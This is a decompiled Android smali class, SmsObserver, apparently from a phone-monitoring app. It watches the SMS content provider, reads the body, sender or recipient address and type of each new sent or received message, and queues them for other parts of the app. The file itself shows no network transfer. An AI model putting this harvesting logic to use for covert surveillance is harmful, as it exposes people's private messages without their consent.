.class public Lcom/hp/vd/module/monitor/sms/SmsObserver;
.super Landroid/database/ContentObserver;
.source "SmsObserver.java"


# static fields
.field protected static final PROVIDER:Ljava/lang/String; = "content://sms/"

.field protected static final TAG:Ljava/lang/String; = "SmsMonitor::SmsObserver"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/SmsData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected isActive:Z

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/SmsData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    const/4 v0, 0x0

    .line 39
    invoke-direct {p0, v0}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->context:Lcom/hp/vd/context/Context;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const/4 v0, 0x1

    .line 35
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->isActive:Z

    .line 41
    iput-object p1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 42
    iput-object p2, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->context:Lcom/hp/vd/context/Context;

    .line 43
    iput-object p3, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 44
    iput-object p4, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public activate()V
    .locals 1

    const/4 v0, 0x1

    .line 49
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->isActive:Z

    return-void
.end method

.method public deactivate()V
    .locals 1

    const/4 v0, 0x0

    .line 54
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->isActive:Z

    return-void
.end method

.method public deliverSelfNotifications()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public onChange(Z)V
    .locals 9

    .line 60
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 62
    iget-boolean p1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->isActive:Z

    if-nez p1, :cond_0

    return-void

    :cond_0
    const-string p1, "content://sms/"

    .line 66
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    .line 68
    new-instance v6, Lcom/hp/vd/module/monitor/sms/Columns;

    invoke-direct {v6}, Lcom/hp/vd/module/monitor/sms/Columns;-><init>()V

    .line 69
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    const/4 v8, 0x3

    .line 73
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "_id"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " > "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_sms_id"

    .line 76
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "_id"

    move-object v1, p1

    .line 73
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 108
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SmsMonitor::SmsObserver"

    const-string v2, "Exception caught when querying cursor"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 82
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SmsMonitor::SmsObserver"

    const-string v3, "SQLiteException caught while quering SMS cursor. Now trying without projection."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x4

    .line 84
    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "_id"

    aput-object v1, v2, v0

    const/4 v0, 0x1

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "type"

    aput-object v1, v2, v0

    const/4 v0, 0x2

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "body"

    aput-object v1, v2, v0

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "address"

    aput-object v0, v2, v8

    .line 93
    :try_start_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "_id"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " > "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_sms_id"

    .line 96
    invoke-virtual {v1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "_id"

    move-object v0, v7

    move-object v1, p1

    .line 93
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_4

    :goto_0
    if-nez v0, :cond_1

    .line 114
    iget-object p1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SmsMonitor::SmsObserver"

    const-string v1, "Cursor for content://sms/ is NULL so skipping this change."

    invoke-interface {p1, v0, v1, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_1
    const/4 p1, 0x0

    .line 126
    :cond_2
    :goto_1
    :try_start_2
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_4

    .line 127
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "type"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "2"

    .line 129
    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_3

    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 130
    :cond_3
    new-instance p1, Lcom/hp/vd/data/SmsData;

    invoke-direct {p1}, Lcom/hp/vd/data/SmsData;-><init>()V

    .line 132
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "_id"

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p1, Lcom/hp/vd/data/SmsData;->internalId:Ljava/lang/Integer;

    .line 133
    iput-object v1, p1, Lcom/hp/vd/data/SmsData;->type:Ljava/lang/String;

    .line 134
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "body"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p1, Lcom/hp/vd/data/SmsData;->content:Ljava/lang/String;

    .line 135
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "address"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p1, Lcom/hp/vd/data/SmsData;->address:Ljava/lang/String;

    .line 136
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    iput-object v1, p1, Lcom/hp/vd/data/SmsData;->createdAt:Ljava/util/Date;

    .line 138
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {v1, p1}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    .line 140
    iget-object p1, p1, Lcom/hp/vd/data/SmsData;->internalId:Ljava/lang/Integer;

    goto :goto_1

    .line 145
    :cond_4
    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    if-nez p1, :cond_5

    .line 154
    iget-object p1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SmsMonitor::SmsObserver"

    const-string v1, "run(): no rows were found with the cursor."

    invoke-interface {p1, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 163
    :cond_5
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_sms_id"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 166
    :try_start_3
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_sms_id"

    invoke-virtual {v1, v2, p1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 168
    iget-object p1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 169
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_2

    :catch_2
    move-exception p1

    .line 172
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_sms_id"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 174
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SmsMonitor::SmsObserver"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "run(): could not commit max_sms_id, reverting to the old value = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v1, v2, v0, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_2
    return-void

    :catch_3
    move-exception p1

    .line 148
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SmsMonitor::SmsObserver"

    const-string v2, "Exception caught while iterating over cursor"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_4
    move-exception p1

    .line 102
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SmsMonitor::SmsObserver"

    const-string v2, "SQLiteException caught while quering SMS cursor with projection. Nothing more to try. Exiting..."

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
